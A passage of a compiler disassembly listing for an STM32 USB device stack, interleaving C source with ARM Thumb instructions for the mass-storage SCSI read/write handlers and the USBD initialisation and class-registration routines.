 800ab20:	603b      	str	r3, [r7, #0]
 800ab22:	460b      	mov	r3, r1
 800ab24:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab26:	68fb      	ldr	r3, [r7, #12]
 800ab28:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab2c:	68fb      	ldr	r3, [r7, #12]
 800ab2e:	32b0      	adds	r2, #176	; 0xb0
 800ab30:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab34:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ab36:	697b      	ldr	r3, [r7, #20]
 800ab38:	2b00      	cmp	r3, #0
 800ab3a:	d102      	bne.n	800ab42 <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ab3c:	f04f 33ff 	mov.w	r3, #4294967295
 800ab40:	e012      	b.n	800ab68 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800ab42:	687a      	ldr	r2, [r7, #4]
 800ab44:	683b      	ldr	r3, [r7, #0]
 800ab46:	441a      	add	r2, r3
 800ab48:	697b      	ldr	r3, [r7, #20]
 800ab4a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab4e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800ab50:	429a      	cmp	r2, r3
 800ab52:	d908      	bls.n	800ab66 <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800ab54:	7af9      	ldrb	r1, [r7, #11]
 800ab56:	2321      	movs	r3, #33	; 0x21
 800ab58:	2205      	movs	r2, #5
 800ab5a:	68f8      	ldr	r0, [r7, #12]
 800ab5c:	f7ff fb62 	bl	800a224 <SCSI_SenseCode>
    return -1;
 800ab60:	f04f 33ff 	mov.w	r3, #4294967295
 800ab64:	e000      	b.n	800ab68 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800ab66:	2300      	movs	r3, #0
}
 800ab68:	4618      	mov	r0, r3
 800ab6a:	3718      	adds	r7, #24
 800ab6c:	46bd      	mov	sp, r7
 800ab6e:	bd80      	pop	{r7, pc}

0800ab70 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ab70:	b590      	push	{r4, r7, lr}
 800ab72:	b085      	sub	sp, #20
 800ab74:	af00      	add	r7, sp, #0
 800ab76:	6078      	str	r0, [r7, #4]
 800ab78:	460b      	mov	r3, r1
 800ab7a:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab7c:	687b      	ldr	r3, [r7, #4]
 800ab7e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab82:	687b      	ldr	r3, [r7, #4]
 800ab84:	32b0      	adds	r2, #176	; 0xb0
 800ab86:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab8a:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ab8c:	68fb      	ldr	r3, [r7, #12]
 800ab8e:	2b00      	cmp	r3, #0
 800ab90:	d102      	bne.n	800ab98 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800ab92:	f04f 33ff 	mov.w	r3, #4294967295
 800ab96:	e07b      	b.n	800ac90 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ab98:	68fb      	ldr	r3, [r7, #12]
 800ab9a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab9e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aba0:	68fa      	ldr	r2, [r7, #12]
 800aba2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aba6:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800abaa:	fb02 f303 	mul.w	r3, r2, r3
 800abae:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800abb0:	68bb      	ldr	r3, [r7, #8]
 800abb2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800abb6:	bf28      	it	cs
 800abb8:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800abbc:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800abbe:	687b      	ldr	r3, [r7, #4]
 800abc0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800abc4:	687a      	ldr	r2, [r7, #4]
 800abc6:	33b0      	adds	r3, #176	; 0xb0
 800abc8:	009b      	lsls	r3, r3, #2
 800abca:	4413      	add	r3, r2
 800abcc:	685b      	ldr	r3, [r3, #4]
 800abce:	691c      	ldr	r4, [r3, #16]
 800abd0:	68fb      	ldr	r3, [r7, #12]
 800abd2:	f103 0110 	add.w	r1, r3, #16
 800abd6:	68fb      	ldr	r3, [r7, #12]
 800abd8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abdc:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800abde:	68fb      	ldr	r3, [r7, #12]
 800abe0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abe4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800abe8:	4618      	mov	r0, r3
 800abea:	68bb      	ldr	r3, [r7, #8]
 800abec:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800abf0:	b29b      	uxth	r3, r3
 800abf2:	78f8      	ldrb	r0, [r7, #3]
 800abf4:	47a0      	blx	r4
 800abf6:	4603      	mov	r3, r0
 800abf8:	2b00      	cmp	r3, #0
 800abfa:	da08      	bge.n	800ac0e <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800abfc:	78f9      	ldrb	r1, [r7, #3]
 800abfe:	2311      	movs	r3, #17
 800ac00:	2204      	movs	r2, #4
 800ac02:	6878      	ldr	r0, [r7, #4]
 800ac04:	f7ff fb0e 	bl	800a224 <SCSI_SenseCode>
    return -1;
 800ac08:	f04f 33ff 	mov.w	r3, #4294967295
 800ac0c:	e040      	b.n	800ac90 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800ac0e:	4b22      	ldr	r3, [pc, #136]	; (800ac98 <SCSI_ProcessRead+0x128>)
 800ac10:	7819      	ldrb	r1, [r3, #0]
 800ac12:	68fb      	ldr	r3, [r7, #12]
 800ac14:	f103 0210 	add.w	r2, r3, #16
 800ac18:	68bb      	ldr	r3, [r7, #8]
 800ac1a:	6878      	ldr	r0, [r7, #4]
 800ac1c:	f002 f8f4 	bl	800ce08 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ac20:	68fb      	ldr	r3, [r7, #12]
 800ac22:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac26:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ac28:	68fb      	ldr	r3, [r7, #12]
 800ac2a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac2e:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac32:	4619      	mov	r1, r3
 800ac34:	68bb      	ldr	r3, [r7, #8]
 800ac36:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac3a:	4413      	add	r3, r2
 800ac3c:	68fa      	ldr	r2, [r7, #12]
 800ac3e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac42:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ac44:	68fb      	ldr	r3, [r7, #12]
 800ac46:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac4a:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ac4c:	68fb      	ldr	r3, [r7, #12]
 800ac4e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac52:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac56:	4619      	mov	r1, r3
 800ac58:	68bb      	ldr	r3, [r7, #8]
 800ac5a:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac5e:	1ad3      	subs	r3, r2, r3
 800ac60:	68fa      	ldr	r2, [r7, #12]
 800ac62:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac66:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800ac68:	68fb      	ldr	r3, [r7, #12]
 800ac6a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac6e:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ac70:	68bb      	ldr	r3, [r7, #8]
 800ac72:	1ad3      	subs	r3, r2, r3
 800ac74:	68fa      	ldr	r2, [r7, #12]
 800ac76:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac7a:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ac7c:	68fb      	ldr	r3, [r7, #12]
 800ac7e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac82:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac84:	2b00      	cmp	r3, #0
 800ac86:	d102      	bne.n	800ac8e <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800ac88:	68fb      	ldr	r3, [r7, #12]
 800ac8a:	2203      	movs	r2, #3
 800ac8c:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800ac8e:	2300      	movs	r3, #0
}
 800ac90:	4618      	mov	r0, r3
 800ac92:	3714      	adds	r7, #20
 800ac94:	46bd      	mov	sp, r7
 800ac96:	bd90      	pop	{r4, r7, pc}
 800ac98:	2000010a 	.word	0x2000010a

0800ac9c <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ac9c:	b590      	push	{r4, r7, lr}
 800ac9e:	b085      	sub	sp, #20
 800aca0:	af00      	add	r7, sp, #0
 800aca2:	6078      	str	r0, [r7, #4]
 800aca4:	460b      	mov	r3, r1
 800aca6:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aca8:	687b      	ldr	r3, [r7, #4]
 800acaa:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800acae:	687b      	ldr	r3, [r7, #4]
 800acb0:	32b0      	adds	r2, #176	; 0xb0
 800acb2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800acb6:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800acb8:	68fb      	ldr	r3, [r7, #12]
 800acba:	2b00      	cmp	r3, #0
 800acbc:	d102      	bne.n	800acc4 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800acbe:	f04f 33ff 	mov.w	r3, #4294967295
 800acc2:	e08e      	b.n	800ade2 <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800acc4:	68fb      	ldr	r3, [r7, #12]
 800acc6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acca:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800accc:	68fa      	ldr	r2, [r7, #12]
 800acce:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acd2:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800acd6:	fb02 f303 	mul.w	r3, r2, r3
 800acda:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800acdc:	68bb      	ldr	r3, [r7, #8]
 800acde:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ace2:	bf28      	it	cs
 800ace4:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ace8:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800acea:	687b      	ldr	r3, [r7, #4]
 800acec:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800acf0:	687a      	ldr	r2, [r7, #4]
 800acf2:	33b0      	adds	r3, #176	; 0xb0
 800acf4:	009b      	lsls	r3, r3, #2
 800acf6:	4413      	add	r3, r2
 800acf8:	685b      	ldr	r3, [r3, #4]
 800acfa:	695c      	ldr	r4, [r3, #20]
 800acfc:	68fb      	ldr	r3, [r7, #12]
 800acfe:	f103 0110 	add.w	r1, r3, #16
 800ad02:	68fb      	ldr	r3, [r7, #12]
 800ad04:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad08:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800ad0a:	68fb      	ldr	r3, [r7, #12]
 800ad0c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad10:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad14:	4618      	mov	r0, r3
 800ad16:	68bb      	ldr	r3, [r7, #8]
 800ad18:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ad1c:	b29b      	uxth	r3, r3
 800ad1e:	78f8      	ldrb	r0, [r7, #3]
 800ad20:	47a0      	blx	r4
 800ad22:	4603      	mov	r3, r0
 800ad24:	2b00      	cmp	r3, #0
 800ad26:	da08      	bge.n	800ad3a <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800ad28:	78f9      	ldrb	r1, [r7, #3]
 800ad2a:	2303      	movs	r3, #3
 800ad2c:	2204      	movs	r2, #4
 800ad2e:	6878      	ldr	r0, [r7, #4]
 800ad30:	f7ff fa78 	bl	800a224 <SCSI_SenseCode>
    return -1;
 800ad34:	f04f 33ff 	mov.w	r3, #4294967295
 800ad38:	e053      	b.n	800ade2 <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ad3a:	68fb      	ldr	r3, [r7, #12]
 800ad3c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad40:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ad42:	68fb      	ldr	r3, [r7, #12]
 800ad44:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad48:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad4c:	4619      	mov	r1, r3
 800ad4e:	68bb      	ldr	r3, [r7, #8]
 800ad50:	fbb3 f3f1 	udiv	r3, r3, r1
 800ad54:	4413      	add	r3, r2
 800ad56:	68fa      	ldr	r2, [r7, #12]
 800ad58:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad5c:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ad5e:	68fb      	ldr	r3, [r7, #12]
 800ad60:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad64:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ad66:	68fb      	ldr	r3, [r7, #12]
 800ad68:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad6c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad70:	4619      	mov	r1, r3
 800ad72:	68bb      	ldr	r3, [r7, #8]
 800ad74:	fbb3 f3f1 	udiv	r3, r3, r1
 800ad78:	1ad3      	subs	r3, r2, r3
 800ad7a:	68fa      	ldr	r2, [r7, #12]
 800ad7c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad80:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800ad82:	68fb      	ldr	r3, [r7, #12]
 800ad84:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad88:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ad8a:	68bb      	ldr	r3, [r7, #8]
 800ad8c:	1ad3      	subs	r3, r2, r3
 800ad8e:	68fa      	ldr	r2, [r7, #12]
 800ad90:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad94:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ad96:	68fb      	ldr	r3, [r7, #12]
 800ad98:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad9c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad9e:	2b00      	cmp	r3, #0
 800ada0:	d104      	bne.n	800adac <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800ada2:	2100      	movs	r1, #0
 800ada4:	6878      	ldr	r0, [r7, #4]
 800ada6:	f7fe fc53 	bl	8009650 <MSC_BOT_SendCSW>
 800adaa:	e019      	b.n	800ade0 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800adac:	68fb      	ldr	r3, [r7, #12]
 800adae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adb2:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800adb4:	68fa      	ldr	r2, [r7, #12]
 800adb6:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800adba:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800adbe:	fb02 f303 	mul.w	r3, r2, r3
 800adc2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800adc6:	bf28      	it	cs
 800adc8:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800adcc:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800adce:	4b07      	ldr	r3, [pc, #28]	; (800adec <SCSI_ProcessWrite+0x150>)
 800add0:	7819      	ldrb	r1, [r3, #0]
 800add2:	68fb      	ldr	r3, [r7, #12]
 800add4:	f103 0210 	add.w	r2, r3, #16
 800add8:	68bb      	ldr	r3, [r7, #8]
 800adda:	6878      	ldr	r0, [r7, #4]
 800addc:	f002 f84c 	bl	800ce78 <USBD_LL_PrepareReceive>
  }

  return 0;
 800ade0:	2300      	movs	r3, #0
}
 800ade2:	4618      	mov	r0, r3
 800ade4:	3714      	adds	r7, #20
 800ade6:	46bd      	mov	sp, r7
 800ade8:	bd90      	pop	{r4, r7, pc}
 800adea:	bf00      	nop
 800adec:	2000010b 	.word	0x2000010b

0800adf0 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800adf0:	b480      	push	{r7}
 800adf2:	b087      	sub	sp, #28
 800adf4:	af00      	add	r7, sp, #0
 800adf6:	60f8      	str	r0, [r7, #12]
 800adf8:	60b9      	str	r1, [r7, #8]
 800adfa:	4613      	mov	r3, r2
 800adfc:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800adfe:	88fb      	ldrh	r3, [r7, #6]
 800ae00:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800ae02:	68fb      	ldr	r3, [r7, #12]
 800ae04:	2b00      	cmp	r3, #0
 800ae06:	d102      	bne.n	800ae0e <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800ae08:	f04f 33ff 	mov.w	r3, #4294967295
 800ae0c:	e013      	b.n	800ae36 <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800ae0e:	8afa      	ldrh	r2, [r7, #22]
 800ae10:	68fb      	ldr	r3, [r7, #12]
 800ae12:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800ae14:	e00b      	b.n	800ae2e <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800ae16:	8afb      	ldrh	r3, [r7, #22]
 800ae18:	3b01      	subs	r3, #1
 800ae1a:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800ae1c:	8afb      	ldrh	r3, [r7, #22]
 800ae1e:	68ba      	ldr	r2, [r7, #8]
 800ae20:	441a      	add	r2, r3
 800ae22:	8afb      	ldrh	r3, [r7, #22]
 800ae24:	7811      	ldrb	r1, [r2, #0]
 800ae26:	68fa      	ldr	r2, [r7, #12]
 800ae28:	4413      	add	r3, r2
 800ae2a:	460a      	mov	r2, r1
 800ae2c:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800ae2e:	8afb      	ldrh	r3, [r7, #22]
 800ae30:	2b00      	cmp	r3, #0
 800ae32:	d1f0      	bne.n	800ae16 <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800ae34:	2300      	movs	r3, #0
}
 800ae36:	4618      	mov	r0, r3
 800ae38:	371c      	adds	r7, #28
 800ae3a:	46bd      	mov	sp, r7
 800ae3c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800ae40:	4770      	bx	lr

0800ae42 <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800ae42:	b580      	push	{r7, lr}
 800ae44:	b086      	sub	sp, #24
 800ae46:	af00      	add	r7, sp, #0
 800ae48:	60f8      	str	r0, [r7, #12]
 800ae4a:	60b9      	str	r1, [r7, #8]
 800ae4c:	4613      	mov	r3, r2
 800ae4e:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800ae50:	68fb      	ldr	r3, [r7, #12]
 800ae52:	2b00      	cmp	r3, #0
 800ae54:	d101      	bne.n	800ae5a <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800ae56:	2303      	movs	r3, #3
 800ae58:	e01f      	b.n	800ae9a <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800ae5a:	68fb      	ldr	r3, [r7, #12]
 800ae5c:	2200      	movs	r2, #0
 800ae5e:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800ae62:	68fb      	ldr	r3, [r7, #12]
 800ae64:	2200      	movs	r2, #0
 800ae66:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800ae6a:	68fb      	ldr	r3, [r7, #12]
 800ae6c:	2200      	movs	r2, #0
 800ae6e:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800ae72:	68bb      	ldr	r3, [r7, #8]
 800ae74:	2b00      	cmp	r3, #0
 800ae76:	d003      	beq.n	800ae80 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800ae78:	68fb      	ldr	r3, [r7, #12]
 800ae7a:	68ba      	ldr	r2, [r7, #8]
 800ae7c:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800ae80:	68fb      	ldr	r3, [r7, #12]
 800ae82:	2201      	movs	r2, #1
 800ae84:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800ae88:	68fb      	ldr	r3, [r7, #12]
 800ae8a:	79fa      	ldrb	r2, [r7, #7]
 800ae8c:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800ae8e:	68f8      	ldr	r0, [r7, #12]
 800ae90:	f001 fdb6 	bl	800ca00 <USBD_LL_Init>
 800ae94:	4603      	mov	r3, r0
 800ae96:	75fb      	strb	r3, [r7, #23]

  return ret;
 800ae98:	7dfb      	ldrb	r3, [r7, #23]
}
 800ae9a:	4618      	mov	r0, r3
 800ae9c:	3718      	adds	r7, #24
 800ae9e:	46bd      	mov	sp, r7
 800aea0:	bd80      	pop	{r7, pc}

0800aea2 <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800aea2:	b580      	push	{r7, lr}
 800aea4:	b084      	sub	sp, #16
 800aea6:	af00      	add	r7, sp, #0
 800aea8:	6078      	str	r0, [r7, #4]
 800aeaa:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800aeac:	2300      	movs	r3, #0
 800aeae:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800aeb0:	683b      	ldr	r3, [r7, #0]
 800aeb2:	2b00      	cmp	r3, #0
 800aeb4:	d101      	bne.n	800aeba <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800aeb6:	2303      	movs	r3, #3
 800aeb8:	e025      	b.n	800af06 <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800aeba:	687b      	ldr	r3, [r7, #4]
 800aebc:	683a      	ldr	r2, [r7, #0]
 800aebe:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800aec2:	687b      	ldr	r3, [r7, #4]
 800aec4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aec8:	687b      	ldr	r3, [r7, #4]
 800aeca:	32ae      	adds	r2, #174	; 0xae
 800aecc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aed0:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800aed2:	2b00      	cmp	r3, #0
 800aed4:	d00f      	beq.n	800aef6 <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800aed6:	687b      	ldr	r3, [r7, #4]
 800aed8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aedc:	687b      	ldr	r3, [r7, #4]
 800aede:	32ae      	adds	r2, #174	; 0xae
 800aee0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aee4:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800aee6:	f107 020e 	add.w	r2, r7, #14
 800aeea:	4610      	mov	r0, r2
 800aeec:	4798      	blx	r3
 800aeee:	4602      	mov	r2, r0
 800aef0:	687b      	ldr	r3, [r7, #4]
 800aef2:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800aef6:	687b      	ldr	r3, [r7, #4]
 800aef8:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800aefc:	1c5a      	adds	r2, r3, #1
 800aefe:	687b      	ldr	r3, [r7, #4]
 800af00:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800af04:	2300      	movs	r3, #0
}
 800af06:	4618      	mov	r0, r3
 800af08:	3710      	adds	r7, #16
 800af0a:	46bd      	mov	sp, r7
 800af0c:	bd80      	pop	{r7, pc}

0800af0e <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800af0e:	b580      	push	{r7, lr}
 800af10:	b082      	sub	sp, #8
 800af12:	af00      	add	r7, sp, #0
 800af14:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

